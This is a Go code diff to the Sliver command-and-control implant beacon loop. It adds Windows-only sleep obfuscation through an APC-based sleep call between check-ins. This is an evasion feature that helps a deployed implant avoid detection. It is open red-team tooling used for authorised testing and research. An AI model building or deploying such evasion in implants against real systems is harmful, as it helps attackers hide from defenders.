@@ -37,6 +37,9 @@ import (
 	"log"
 	// {{end}}
 
+	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+	"github.com/bishopfox/sliver/implant/sliver/apc"
+	// {{end}}
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
@@ -269,6 +272,9 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 	pendingResults := make(chan *sliverpb.Envelope, 100)
 	errors := make(chan error)
 	shortCircuit := make(chan struct{})
+	// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+	completion := make(chan bool, 1)
+	// {{end}}
 
 	for {
 		duration := beacon.Duration()
@@ -287,6 +293,10 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 				// the current sleep and tell the server when the next checkin will
 				// be based on the new interval.
 				shortCircuit <- struct{}{}
+			} else { // err is nil
+			// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+				completion <- true
+			// {{end}}
 			}
 		}()
 
@@ -296,7 +306,15 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		select {
 		case <-errors:
 			return err
+		// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+		case <-completion:
+			timeUntilNextCheckIn := time.Until(nextCheckin)
+			if timeUntilNextCheckIn.Seconds() > 1 {
+				apc.Sleep(uint64(timeUntilNextCheckIn.Milliseconds()))
+			}
+		// {{else}}
 		case <-time.After(duration):
+		// {{end}}
 		case <-shortCircuit:
 			// Short circuit current duration with no error
 		}
